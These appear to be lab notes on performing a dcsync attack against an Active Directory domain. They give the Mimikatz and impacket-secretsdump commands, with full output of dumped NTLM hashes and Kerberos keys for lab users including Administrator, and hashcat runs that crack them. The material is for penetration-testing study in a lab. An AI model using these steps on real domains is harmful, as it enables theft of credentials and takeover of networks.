To launch such a replication, a user needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.

If we obtain access to a user account in one of these groups or with these rights assigned, we can perform a dcsync attack in which we impersonate a domain controller. This allows us to request any user credentials from the domain.

To perform this attack, we'll use Mimikatz on a domain-joined Windows machine, and impacket-secretsdump5 on our non-domain joined Kali machine.

## Using mimikatz

let's open a PowerShell window and launch Mimikatz in C:\Tools. For Mimikatz to perform this attack, we can use the lsadump::dcsync module and provide the domain username for which we want to obtain credentials as an argument for /user:. For the purposes of this example, we'll target the domain user dave.

```
PS C:\Users\jeffadmin> cd C:\Tools\

PS C:\Tools> .\mimikatz.exe
...

mimikatz # lsadump::dcsync /user:corp\dave
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\dave' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : dave

** SAM ACCOUNT **

SAM Username         : dave
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
Account expiration   :
Password last change : 9/7/2022 9:54:57 AM
Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
Object Relative ID   : 1103

Credentials:
    Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d
```

 Using Hashcat to crack the NTLM hash obtained by the dcsync attack
```
kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
08d7a47a6f9f66b97b1bae4178747494:Flowers1              
```

We can now obtain the NTLM hash of any domain user account of the domain corp.com. Furthermore, we can attempt to crack these hashes and retrieve the plaintext passwords of these accounts.

we can perform the dcsync attack to obtain any user password hash in the domain, even the domain administrator Administrator.

Using Mimikatz to perform a dcsync attack to obtain the credentials of the domain administrator Administrator
```
mimikatz # lsadump::dcsync /user:corp\Administrator
...
Credentials:
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
...
```

## Using impacket-secretsdump

To launch it, we'll enter the target username dave as an argument for -just-dc-user and provide the credentials of a user with the required rights, as well as the IP of the domain controller in the format domain/user:password@ip.

Using secretsdump to perform the dcsync attack to obtain the NTLM hash of dave
```
kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
[*] Kerberos keys grabbed
dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
dave:des-cbc-md5:1a329b4338bfa215
[*] Cleaning up...
```

 It shows that we successfully obtained the NTLM hash of dave. The output of the tool states that it uses DRSUAPI,6 the Microsoft API implementing the Directory Replication Service Remote Protocol.

The dcsync attack is a powerful technique to obtain any domain user credentials. As a bonus, we can use it from both Windows and Linux. By impersonating a domain controller, we can use replication to obtain user credentials from a domain controller. However, to perform this attack, we need a user that is a member of Domain Admins, Enterprise Admins, or Administrators, because there are certain rights required to start the replication. Alternatively, we can leverage a user with these rights assigned, though we're far less likely to encounter one of these in a real penetration test.


## Example

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> cd C:\Tools\
PS C:\Tools>
PS C:\Tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:corp\Administrator
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 8/16/2022 8:27:22 PM
Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 731b7c2aa33ef31284bed1e7895123de

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-D74CT1583SRAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 56136fd5bbd512b3670c581ff98144a553888909a7bf8f0fd4c424b0d42b0cdc
      aes128_hmac       (4096) : 3d58eb136242c11643baf4ec85970250
      des_cbc_md5       (4096) : fd79dc380ee989a4
    OldCredentials
      aes256_hmac       (4096) : aefc3b3587d7f6786dd4bd53647bc7ce09148c3556172fd86d2eb24a59924248
      aes128_hmac       (4096) : bae2ca0a0a705c2b965e10321860f4ca
      des_cbc_md5       (4096) : 0e7c641c573ddac2

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-D74CT1583SRAdministrator
    Credentials
      des_cbc_md5       : fd79dc380ee989a4
    OldCredentials
      des_cbc_md5       : 0e7c641c573ddac2
```

Getting hash 2892d26cdf84d7a70e2eb3b9f05c425e

```
┌──(kali㉿kali)-[~/LateralMovementAD]
└─$ cat hashesAdminDC01.dcsync 
2892d26cdf84d7a70e2eb3b9f05c425e

```

```
hashcat -m 1000 hashesAdminDC01.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

```
┌──(kali㉿kali)-[~/LateralMovementAD]
└─$ hashcat -m 1000 hashesAdminDC01.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, 2553/5171 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

INFO: All hashes found as potfile and/or empty entries! Use --show to display them.

Started: Fri Aug 23 17:19:31 2024
Stopped: Fri Aug 23 17:19:31 2024
                                                                                                                   
┌──(kali㉿kali)-[~/LateralMovementAD]
└─$ hashcat -m 1000 hashesAdminDC01.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show
2892d26cdf84d7a70e2eb3b9f05c425e:lab
```